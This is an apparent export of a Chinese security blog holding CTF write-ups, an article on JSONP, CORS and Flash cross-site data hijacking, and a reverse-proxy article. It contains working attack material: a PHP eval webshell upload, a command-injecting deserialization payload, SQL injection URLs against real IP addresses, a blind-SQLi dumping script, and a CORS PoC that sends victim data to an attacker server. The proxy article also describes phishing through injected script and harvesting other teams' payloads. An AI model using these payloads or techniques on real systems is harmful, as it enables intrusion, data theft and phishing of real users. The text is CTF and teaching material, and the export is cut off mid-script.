接着可以使用x/../1.php/.进行文件覆盖1234567891011121314151617181920212223242526272829303132333435POST /file_upload/shanghai/1.php HTTP/1.1Host: ctfUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------20782431812432Content-Length: 717Referer: http://ctf/file_upload/shanghai/upload.htmlConnection: closeUpgrade-Insecure-Requests: 1-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[1]&quot;jpg-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[0]&quot;x/../1.php/.-----------------------------20782431812432Content-Disposition: form-data; name=&quot;hehe&quot;1.php-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: application/octet-stream@&lt;?php $file = &apos;1ndex.php&apos;;$code = &apos;&lt;?php eval($_POST[\&apos;passer6y\&apos;]);?&gt;&apos;;file_put_contents($file,$code);?&gt;-----------------------------20782431812432Content-Disposition: form-data; name=&quot;submit&quot;submit-----------------------------20782431812432-- 这样就可以拿到shell了。 sn00py师傅最初的非预期解法，就是因为想到，hehe变量不能包含自己传上去的文件，所以开多个爆破程序，让A程序和B程序相互产生的随机数相互碰撞，直到包含成功。 web3题目：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php error_reporting(E_ALL); class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125; $first=&apos;hi&apos;; $var=&apos;var&apos;; $bbb=&apos;bbb&apos;; $ccc=&apos;ccc&apos;; $i=1; foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125; &#125; if($first===&quot;doller&quot;) &#123; @parse_str($_GET[&apos;a&apos;]); // 注册变量 if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&apos;come&apos;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125; &#125; else &#123; echo &quot;Can you hack me?&lt;br&gt;&quot;; &#125;?&gt; 这题先考察变量覆盖，再考察反序列化漏洞。37行处$i变量覆盖一直想多循环几次多覆盖几个变量，结果发现传入的i=1的类型是字符型，而if判断的是===。所以这里就只能先覆盖$first变量进入，parse_str部分,这里可以继续覆盖变量，文档,所以可以构造payload：12?first=doller&amp;a%3dvar%3dgive%26bbb%3dme%26ccc%3dflag// 解码后：?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag 下面就考察反序列化的东西了，构造函数传入参数，析构函数回调echo函数。需要绕过waf函数。&amp;拼接命令，${IFS}绕过空格，fl””ag绕过flag的限制。 payload：12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(E_ALL);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); // 注册变量，过滤值 &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; echo &quot;\n&quot;; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125;$args = array(&apos;1&amp;cat$&#123;IFS&#125;fl&quot;&quot;ag&apos;);$aa = new come(&quot;echo&quot;,$args);echo urlencode(serialize($aa)); 本地测试： web4一个后台登录页，还有一个注入点。 if sleep # 没被过滤11&apos;+and+if((SELECT+VERSION())&gt;1,sleep(3),0)%23 mid 也没被过滤11&apos;+and+if(mid((SELECT+VERSION()),1,1)+&gt;1,sleep(3),0)%23 测下面这条语句被拦了11&apos;+and+if(mid((SELECT+schema_name+from+information_schema.SCHEMATA+limit+1,1),1,1)+&gt;1,sleep(3),0)%23 下面这个证明拦截了关键字information_schema.11&apos;+and+if(mid((SELECT+schema_name+from+SCHEMATA+limit+1,1),1,1)+&lt;1,sleep(3),0)%23&amp;Submit=Select+Guest 可以用information . tables绕过，然后提示str_replace为空，所以需要双写，这里需要fuzz一下过滤的东西。然后双写select和from即可绕过11&apos;+and+if+((ascii(mid((seselectlect+table_name+frofromm+information_schema+.+tables+limit+1),1,1))&gt;1),sleep(3),0)%23 这里还有一个显注的方法：1id=sd&apos; unifromon selselectect (seselectlect group_concat(username,&apos;:&apos;,password)frfromom web.user),2#: https://xz.aliyun.com/t/3153#toc-3 接下来就是一个文件上传这里得想办法截断txt,或许是nginx解析漏洞？ sn00py师傅教我fuzz，0x00-&gt;0xff 然后尝试截断后面的txt，先用脚本生成一下字典12345for i in range(0,256): i = bytes(chr(i), &apos;utf8&apos;) with open(&quot;dic.txt&quot;, &quot;ab+&quot;) as f: f.write(i) f.write(bytes(&apos;\n&apos;, &apos;utf-8&apos;))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨站数据劫持]]></title>
    <url>%2F2018%2F09%2F16%2F%E8%B7%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[学习了一下常见的前端漏洞 0x01 基础一：HTTP协议 请求行GET /images/logo.gif HTTP/1.1 HTTP 请求头 Authorization Origin Cookie Host Referer User-Agent X-Forwarded-For 3.HTTP 响应头 Access-Control-Allow-Origin Access-Control-Allow-Credentials Location Set-Cookie X-XSS-Protection Content-Security-Policy server X-Powered-By X-Frame-Options 二： 什么是CSP(Content Security Policy)？CSP是一种由开发者定义的安全政策声明，通过csp约束的规则指定可信的内容来源。包括脚本、图片、iframe、style等可能的远程资源。CSP主要是为了减缓XSS、clickjacking和其他的一些代码注入的攻击，目的是尽量使可执行的内容从可信的目标传递过来。 CSP的浏览器支持情况CSP有三个header： Content-Security-Policy：chrome 25+，Firefox 23+，Opera 19+ X-Content-Security-Policy：Firefox 23+，IE10+ X-WebKit-CSP：Chrome 25+ 日常见到最多的就是Content-Security-Policy Header： CSP支持的指令参考：http://content-security-policy.com/1default-src,script-src,object-src,style-src,img-src,media-src,frame-src,font-src,connect-src,form-action,sandbox,script-nonce,plugin-types,reflected-xss,report-uri 预设的值有1234none: 不匹配任何东西self: 匹配当前域，(不包括子域，比如example.com可以，api.example.com 则会匹配失败。)unsafe-inline 允许内嵌的脚本及样式。是的，没看错，对于页面中内嵌的内容也是有相应限制规则的。unsafe-eval 允许通过字符串动态创建的脚本执行，比如eval，setTimeout 等。 还有的将值位置为nonce值，一个随机的字符串，表示只加载含有该随机字符串的文件。 浏览器安全策略说之内容安全策略CSP 三： 同源策略(SOP)又是什么？同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。相同源：当两个域具有相同的协议，相同的域名，同端口，说明这是相同源。 四：那么如何跨域获取资源？由于受到同源策略的影响，跨域数据会受到制约。但是人们想出了很多跨域的方式。 https://juejin.im/entry/58a3ca13128fe10058c5863b Jsonp CORS(Cross-Origin Resource Sharing) Cross-document messaging document.domain 属性 WebSocket 五：Jsonp原理其实很简单，就是利用&lt;script&gt;标签没有跨域限制的“漏洞”,达到与第三方通讯的目的，形如：1&lt;script src=&quot;http://www.example.net/api?callback=Passer6y&quot;&gt;&lt;/script&gt; 客户端传递一个callback参数给服务端-&gt;服务端用callback参数包裹住json数据(将passer6y当函数名，json数据当函数的参数)-&gt;客户端js中的(passer6y)回调数据。简单理解为：带callback的json就是jsonp实现过程如下：A网站想要获取B网站的用户数据，A网站中js写法如下：1234567891011&lt;script type=&quot;text/javascript&quot;&gt; var script = document.createElement(&apos;script&apos;); var url = &apos;http://127.0.0.1/server.php?callback=passer6y&apos;; script.src = url; document.body.appendChild(script); function passer6y(json) &#123; var obj = JSON.parse(json); alert(obj); &#125;&lt;/script&gt; B网站将数据打包好，回传给A网站，并调用A站的passer6y函数：1234567&lt;?php$userInfo = &apos;FDrag0n&apos;;$jsdata = json_encode($userInfo);!empty($_GET[&apos;callback&apos;]) ? $_GET[&apos;callback&apos;] : &apos;callback&apos;;echo $_GET[&apos;callback&apos;].&apos;(&apos;.json_encode($jsdata).&apos;)&apos;;?&gt; A网站执行paser6y函数： 还有一些其他标签跨域的方法：https://www.anquanke.com/post/id/97671 六：CORS：跨域资源共享因为浏览器会限制从脚本发起的跨域HTTP请求(比如：XMLHttpRequest、Fetch APIs)，而且jsonp传输数据难以做权限校验，如果传输过程涉及敏感信息，恶意的网站B将数据jsonp的数据接口嵌入自己的网站页面，从而用户访问者浏览B页面的时候，将其在A站的敏感数据盗取(CSRF)。这时候就出现了CORS。 否则就会被同源策略限制： 详情：MDN CORS Docs 如果设置允许发送cookie:Access-Control-Allow-Credentials: true，那么就和CSRF一样了。 跨域资源共享CORS详解 0x02 Jsonp 劫持1.利用条件： 使用Jsonp获取数据 没有校验referer，或referer可绕过 GET请求中不包含token相关参数。 Discover？挖掘Jsonp漏洞的关键就是寻找回调函数，常见的Callback参数如下：12345678910callback cb jsonp jsonpcallback jsonpcb jsonp_cb json= jsoncallback jcbcall 如何自动化查找这样的接口？过滤burpsuite/Fiddler记录，一个一个的人工排查。或者用Selenium + Proxy + 验证脚本： Selenium: 在网页上瞎点按钮、超链接等 Proxy： 记录所有请求，过滤带有敏感信息的jsonp请求，并记录下HTTP请求 验证脚本：去掉Referer字段，再次发送请求jsonp_info_leak Tools Exploit将含有jsonp劫持漏洞的数据接口嵌入我们的Attack站上，用户点开窃取受害者账户信息 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;xxxx CORs Poc&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h2&gt;xxxx CORs POC&lt;/h2&gt; &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Poc&lt;/button&gt; &lt;/div&gt; &lt;script&gt; function cors()&#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123; if(this.readyState == 4 &amp;&amp; this.status == 200) &#123; document.location=&apos;http://记录数据的服务器地址?&apos;+escape(this.responseText); &#125; &#125;; xhttp.open(&apos;GET&apos;,&apos;https://jsonp接口&apos;,true); xhttp.withCredentials = true; xhttp.send(); &#125;&lt;/script&gt; Bypass正则配置不当绕过：.*domain\.com-&gt;domain.com.evil.me空referer绕过：&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; jsonp跨域传输的url可控的话，说不定还能造成xss等其他问题 参考： 如何挖掘Jsonp漏洞JSONP与CORS漏洞挖掘 0x03 Flash跨域数据劫持Flash跨域访问的时候主要受到crossdomain.xml文件的影响，当A网站嵌入一个Flash，然后Flash跨域请求B网站下的资源，这个时候就会先查看B网站下的crossdomain.xml文件是否允许A网站Flash请求B网站的资源。 模板站点下必须存在crossdomain.xml，且配置循序其他域的AS脚本进行跨域请求1234&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt; 如果allow-access-from domain被设置为*后，可能造成Flash Csrf的风险(同时这也是我们搜集子域名的一种方式~)。 Discover利用条件即：crossdomain.xml中的allow-access-from domain=*或者过滤规则不严。所以可以爬行网站的全部域名跟目下的crossdomain.xml文件是否存在配置漏洞或者Google Hacking:inurl:crossdomain filetype:xml。其次需要找到一个能获取敏感信息的接口，然后构建swf的poc对外发送http请求。 还有一种情况,可以无视crossdomain.xml文件: 文件上传+Flash csrf就是如果有allow-access-from domain=A.victim.com的限制，则只能去允许的域下找上传点,然后上传swf的exp(扩展名随便换)，然后创建Attack.com页面，用object标签去包含我们上传在victim.com站内的swf文件，有用户访问Attack.com的时候，就会加载victim.com中的swf exp向敏感数据接口发送http请求等，造成跨域数据劫持。 Exploit POC：Cross-Site Content (Data) Hijacking (XSCH) PoC Project 这里本地搭建好测试的过程： 或者使用Flash ActionScript跨域发送请求1234import flash.net.*;var _l = new URLLoader(new URLRequest(“http://目标站点/&quot;));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 案例：Flash跨域数据劫持即使上传JPG文件也可能导致跨站点内容劫持 0x04 CORS跨域资源读取这个没啥好说的，配置不当导致，看到access-Control-Allow-Origin为*，或者可绕过。然后还Access-Control-Allow-Credentials为TRUE,发送cookie，和CSRF一样， demo：Victim.com：1234&lt;?phpheader(&apos;Access-Control-Allow-Origin: *&apos;);//header(&apos;Access-Control-Allow-Credentials:true&apos;);echo &quot;Fdrag0n love bed&quot;; Attack.com:12345678910&lt;script&gt;var request = new XMLHttpRequest();request.open(&quot;GET&quot;, &quot;http://107.175.17.240/1.php&quot;, true);request.send();request.onreadystatechange = function()&#123; if(request.readyState === 4 &amp;&amp; request.status === 200)&#123; alert(request.responseText); &#125;&#125;&lt;/script&gt; 平台Cross-Site Content (Data) Hijacking (XSCH) PoC Project Silverlight跨域PostMessage0x05 Some攻击(Same Origin Method Execution)SOME，类似于Hijking攻击，是同源代码执行漏洞的简称。 危害：理论上任何具备点击功能的网站都存在这种攻击的可能，缺陷就是不能带参数进行操作 利用条件 Jsonp回调值可控 没有过滤.符号和函数 原理五个页面：index.html、step1.html、jsonp.html、json_data.php、function.htmlindex.html1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;SOME Main&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;&lt;script type=&quot;text/javascript&quot;&gt; function startSOME() &#123; myWindow=window.open(&apos;http://127.0.0.1/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;); window.location.href = &quot;http://127.0.0.1/function.html&quot;;&#125; startSOME();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; step1.html12345678910&lt;html&gt;&lt;script&gt;function waitForDOM() &#123; window.location.href =&quot;http://127.0.0.1/jsonp.php?callback=window.opener.shareAllPhotos&quot;;&#125;setTimeout(waitForDOM,3000);&lt;/script&gt;&lt;/html&gt; jsonp.php1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;&lt;?phpecho &apos;&lt;script src=&quot;http://127.0.0.1/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;?&gt;&lt;/head&gt;&lt;/html&gt; json_data.php12345&lt;?phpecho $_GET[&quot;callback&quot;] . &quot;(&#123; Fdrag0n : &apos;Fdrag0n L0ve sleep&apos; &#125;);&quot;;?&gt; function.html1234567891011121314&lt;html&gt;&lt;head&gt;&lt;title&gt;Google Photos&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; function shareAllPhotos(data) &#123; prompt(data.Fdrag0n); &#125; console.log(window.opener); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Exploit&amp;Toolshttps://github.com/linkedin/sometime Defence 回调值固定(或者白名单)，外部不可控 Game:Same Origin Method Execution 0x07 组合拳自己臆想的几种… 还没有实现 XSS+CORS数据劫持绕过access-Control-Allow-Origin 文件上传(图片、PDF、txt都行) + Flash Csrf绕过crossdomain Practice1.]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅析反向代理]]></title>
    <url>%2F2018%2F07%2F05%2F%E6%B5%85%E6%9E%90%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[最近这段时间频频接触到反代的东西，所以就更进一步的了解了一番, 有什么不对的地方还请大佬们指正~本文需要用到的代码已上传Github本文由安全客原创发布 本文涉及到的东西仅供技术研究，请勿用于非法用途，否则后果自负 浅析反向代理0x01: 前言最近把博客重新弄了一下，发现了一个特别有意思的东西，看图~ 还有一些有意思的东西，比如反代谷歌(谷歌镜像站)、钓鱼、绕过国内备案和线下CTF中的一些骚操作，等等。 0x02: 简介反向代理，简而言之就是反向代理服务器从目标内容服务器上抓取内容返回给用户，反向代理服务器充当一个中介功能，他本身是没有任何内容的。区别于正向代理而言，反向代理是代理的服务端，而正向代理是代理的客户端。 再来简单介绍一下我在前言中所说的我让我的博客ip是如何变成1.1.1.1的，其实1.1.1.1是一台DNS服务器(号称全球最快的DNS)，正好1.1.1.1又是cf cdn中的一个节点。这样我们就可以将域名解析到1.1.1.1，然后在cf中设置好真实的回源地址即可。在文末已附上教程链接，感兴趣的可以玩玩~ 0x03: 一些有意思的东西除了上述所说的套一个CDN，让自己ip变成1.1.1.1来隐藏自己站点ip，还有一些其他好玩的~ CTF线下中的一些思路因为我们线下赛中每支队伍的web站点都一样，笔者在之前的一次线下训练赛的时候尝试过修改apache配置文件来反代分数最高的队伍的站点，从而达到流量转发(伤害转移)的效果。这个具体能不能实现得看服务器的权限能提升到多高，其次也得根据具体的check机制来灵活使用。如果提升的权限不够高的话，也可以配置.htaccess来实现反代。用tcpdump倒流量顺手抓一波别人的payload。如果我们采用的是.htaccess方法进行反向代理，这里说一下这种方法的原理和其他的不同在于它本质上是利用.htaccess映射到一个php文件，然后利用php文件去抓取目标服务器的信息返回给客户端。这里.htaccess配置的作用是重写url。所以我们不妨在这个php文件中包含一下这个demo1.php即可达到payload的记录的效果： 代码如下：demo1.php12345678910111213141516171819202122232425262728&lt;?phpwrite_log();function get_http_raw() &#123; $raw = ''; $raw .= $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n"; foreach($_SERVER as $key =&gt; $value) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; $key = substr($key, 5); $key = str_replace('_', '-', $key); $raw .= $key.': '.$value."\r\n"; &#125; &#125; $raw .= "\r\n"; $raw .= file_get_contents('php://input'); return $raw;&#125;function write_log()&#123; $data = date("Y/m/d H:i:s")."\r\n".get_http_raw()."\r\n\r\n"; $file = fopen('log1.txt', 'a'); //日志路径 fwrite($file, $data); fclose($file); &#125; 记录如下: 克隆网站 –中间人攻击我们可以安装一个nginx的第三方模块ngx_http_substitutions_filter_module,然后nginx的配置文件中加入一段，即可弹窗等。 1subs_filter &lt;/head&gt; &quot;&lt;script&gt;alert(&apos;1&apos;);&lt;/script&gt;&lt;/head&gt;&quot;; location部分的配置如下： 这里有个坑弄了我好久… 就是我们请求网站的时候，数据包头部一般会有Accept-Encoding部分，如下图所示，这个部分告诉服务器，客户端能以怎样的形式解码。那么问题来了，数据包是压缩的，我们怎样才能用subs_filter 替换其中的内容呢？ 其实正像上面截图的配置那样设置：反代服务器请求上游服务器的时候带上Accept-Encoding=‘ ’ 即可，表示不接受任何压缩数据。 访问http://a.cuit.store,效果如下： 这样如果我们反代一个登录页面，比如qq空间，然后植入我们的js脚本，后果emmm…当然了，不同站的反代难度是不一样的~ 绕过网站所有权验证，调用在线的云扫描器给我们需要渗透的网站进行扫描以人人扫这个云扫描平台为例：http://www.renrenscan.com/， 其中需要我们把一个认证文件放到网站根目录上，我们可以设置反代规则的时候，对这个文件进行排除，不进行代理即可绕过，或者直接用.htaccess的方法进行反代就行。这样我们只需要等待扫描结果，即可get目标站的漏洞了~ 如果我们再邪恶一点….顺便也可以包含上demo1.php，把这些扫描的payload都导出来下来(手动滑稽) ps：这里说点其他的，我发现在给我博客加cdn的时候，发现了如下图所示的这个，因为我用的是cloudflare免费版的套餐，可以看到有很多请求没有经过CDN处理就直接回源了，这就可以让我们想到如果我们渗透的站点是套了CDN的，常规的找邮件服务器，静态文件，ssrf啥的如果都不管用，还不如来点简单粗暴的，暴力发包让CDN承受不住而回源，这样真实ip’轻松’get~ 0x04: 反向代理不当一般当我们遇到了反代服务器的时候，可以试着用burpsuite的repeat功能，设置host为反代服务器，然后把http请求中的路径改为内网中的host(一般需要穷举，穷举网段ip端口域名等等)。因为反向代理的本质就是将客户端的请求url重写后发往上游服务器，将返回结果发回客户端，在这之中，如果对路径的配置不当就有可能导致反向代理变正向代理导致一些信息泄露，内网穿透等等漏洞。 参考：陌陌web服务器Path处理不当可以正向代理内网穿透代理洞谷歌内部主机信息泄露漏洞新浪HTTP代理配置不当漫游内网挖洞经验之代理不当日进内网 还有一种就是nginx为Django做反代的时候，静态文件配置错误导致源码泄露 ##0x05: 如何防止被反向代理反向代理不仅会对用户造成威胁，而且对服务器来说也会增强负载，还有就是通过代理的方式盗取网站数据，还有就是seo相关的影响了等等… 通过js防止反代：如果地址栏的网址不是www.passer6y.fun那么就进行跳转。12345&lt;script type=&quot;text/javascript&quot;&gt;if (document.domain !=&apos;www.passer6y.fun&apos;)&#123; window.location.href=&apos;http://www.passer6y.fun/&apos;;&#125;&lt;/script&gt; 其实这种方法还是可以绕过的，nginx有扩展模块可以将指定的字符进行替换，这时我们只需将target域名替换成我们自己的就行了(上文有说到如何替换)。或者直接不代理这个js文件也行。 php 123456&lt;?php if($_SERVER[&apos;SERVER_NAME&apos;] != &apos;www.passer6y.fun&apos; ) &#123; header(&apos;Location: http://www.passer6y.fun/&apos;);&#125; ?&gt; .htaccess .htaccess123RewriteEngine On RewriteBase / php_value auto_append_file proxy.php proxy.php12345678&lt;?php $f = getenv(“HTTP_X_FORWARDED_FOR”); $server = getenv(“HTTP_HOST”); if (($f!=””)&amp;&amp;($server!=”www.passer6y.fun”)&#123; echo ‘本服务器禁止恶意反向代理！’; &#125; ?&gt; 0x06: Apache 反代配置方法1. windows下：修改配置文件：Apache\conf\httpd.conf，将以下两个前面的注释符去掉。12#LoadModule proxy_module modules/mod_proxy.so#LoadModule proxy_http_module modules/mod_proxy_http.so 然后新增一个Apache\conf\vhosts.conf文件123456789101112131415161718192021&lt;VirtualHost *:80&gt; ServerAdmin admin # 域名信息 ServerName passer6y.cn # 邮件信息 ProxyRequests Off &lt;Proxy *&gt; Order deny,allow Allow from all &lt;/Proxy&gt; ProxyPass / http://passer6y.cn/ # 将一个远端服务器映射到本地服务器的URL空间 ProxyPassReverse / http://passer6y.cn/ # 调整由反向代理服务器发送的HTTP回应头中的URL。 &lt;/VirtualHost&gt; 2. linux下 参考：https://www.leaseweb.com/labs/2014/12/tutorial-apache-2-4-transparent-reverse-proxy/测试环境：Ubuntu 16.04，apache2加载”proxy_http”模块：12sudo a2enmod proxy_httpsudo service apache2 restart 在/etc/apache2/sites-available/下，修改配置：123456&lt;VirtualHost *:80&gt; ProxyPreserveHost On ProxyPass / http://192.168.83.1/ # 指定根URL(/)下的内容映射到给定地址的后端服务器 ProxyPassReverse / http://192.168.83.1/ &lt;/VirtualHost&gt;~ 重启apache生效配置：12sudo service apache2 reloadsudo service apache2 restart 3. .htaccess配置反向代理这种方法配置反向代理准确的说是php反向代理，我们通过.htaccess中配置一些重写规则，然后把请求映射到一个php文件中，这个php帮我们请求上游服务器的内容，然后将上游服务器的返回的内容获取回来发回客户端。这种配置反代的好处是所需权限比较小，但是也有很多弊端，随着网站的复杂度，我们所写的抓取页面的php脚本难度就不大一样了。 Github上放了3个php反代脚本的demo，使用说明也见里面的readme即可。 ##0x07 nginx 反向代理 1. 简单反代Nginx核心配置文件nginx.conf：123456789 server &#123; listen 80; # 监听端口(web服务端口) server_name localhost; # 当前服务的域名，这里是本地测试 location / &#123; # 这里的/ 表示把服务器的根目录反代到www.baidu.com的根目录。 proxy_pass http://www.baidu.com; proxy_redirect default; &#125;&#125; 2. 实例：反代Google 测试环境：cent os7条件准备：一个域名，OneinStack一键安装lnmp，Let’s Encrypt 的ssl证书 接下来编辑nginx下的主机配置文件：/usr/local/nginx/conf/vhost/然后在最后插入：1234567location / &#123; proxy_set_header Host &quot;www.google.com&quot;; proxy_set_header User-Agent $http_user_agent; proxy_set_header Connection &quot;&quot;; proxy_http_version 1.1; proxy_pass https://www.google.com;&#125; 检测Nginx配置是否正确：123[root@vultr vhost]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 重载Nginx服务：12[root@vultr vhost]# service nginx reloadReloading nginx configuration (via systemctl): [ OK ] 打开google.cuit.store，成功~ 0x08 结语这次介绍了我所了解的三种反代情况以及其中一些有意思的玩法。笔者能力有限，第一次写文章有什么理解不对的地方还请大家多多指点！]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku Write Up]]></title>
    <url>%2F2018%2F07%2F04%2Fbugkuwp%2F</url>
    <content type="text"><![CDATA[之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。本文属i春秋原创奖励计划，禁止转载，原文链接 Bugku Write Up前言之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。 报错 题目说：访问参数为：?id=x不允许包含“–”，空格，单引号，双引号，“union”关键字，查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php 针对上述过滤，我们可以采用如下办法绕过： 空格：/**/ --：用# union: uni%00on 引号：hex编码 下面就可以开心的玩耍了~爆库:1http://103.238.227.13:10088/id=0x3122/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x3a(select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/0,1),floor(rand()*2),0x3a,0x3a/**/)name/**/from/**/information_schema.tables/**/group/**/by/**/name)/**/b)/**/# 发现第二个数据库：sql41不过flag并不在这，他让我们查询文件路径。参考这篇文章总结的12个错方式floor报错怎么也读不出文件，于是试了一下extractvalue报错：1http://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/hex(load_file(0x2f7661722f746573742f6b65795f312e706870)))))/**/# 这里得把load_file()整个函数给hex编码，不然不知道为啥，不出数据读出flag：不过,这只是其中的一节，我们还得想办法弄到后面的字符，这里采用substr()： 1http://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/concat(0x5c,substr((load_file(0x2f7661722f746573742f6b65795f312e706870)),100,30),0x5c)),0x5c))/**/# 截断几次后可以看到flag： 这题真坑啊，要用中文的两个右双引号包裹才能成功交上去…Flag:”7249f5a7fd1de602b30e6f39aea6193a” insert into 参考文章： https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://www.jianshu.com/p/232071aa51ba 题示信息：1234567891011121314151617181920212223flag格式：flag&#123;xxxxxxxxxxxx&#125;不如写个Python吧error_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 根据题示信息可以知道：只有插入。没有输出，可以用时间盲注。时间盲注就是在之后返回的内容相同，没法进行判断的时候；在mysql数据库中插入sleep()函数，如果()语句能正确执行的话，&amp;&amp;就不会短路，sleep()可以执行，这样响应时间就会增大；而()发生错误没有返回结果时，&amp;&amp;会把sleep()函数短路无法执行；伪造请求头：X-Forwarded-For: 1’ and sleep(5) and ‘1’ = ‘1注意不能用来括号闭合 ！！脚本如下: 当初想的是自动化脱裤…代码有点简陋，需要完善的地方还是挺多的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# encoding:utf-8import requests,time,stringcharacters = string.ascii_letters + string.digits + string.punctuationmax_length = 50target = 'http://120.24.86.145:8002/web15/'cur_database = "'+(select case when (substring((select database() ) from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1"# 猜解字母def get(payload): flag = '' for i in range(1, max_length): # i 表示了所要查找的名字的最大长度 next_position = False for char in characters: # 0x80=128 , 0x20=32, 32-128为可显示的字符的区间 payload_ = payload.format(str(i), char) headers = &#123; 'X-Forwarded-For': payload_ &#125; try: r = requests.get(target,headers=headers,timeout=4) except requests.exceptions.ReadTimeout: flag += char print(flag) next_position = True break if not next_position: return flag# 指定数据库，获取其下全部表名def get_table(database): for i in range(0,5): print("正在查询数据库" + database + "中的表") payload = "'+(select case when (substring((" \ "select table_name from information_schema.tables where 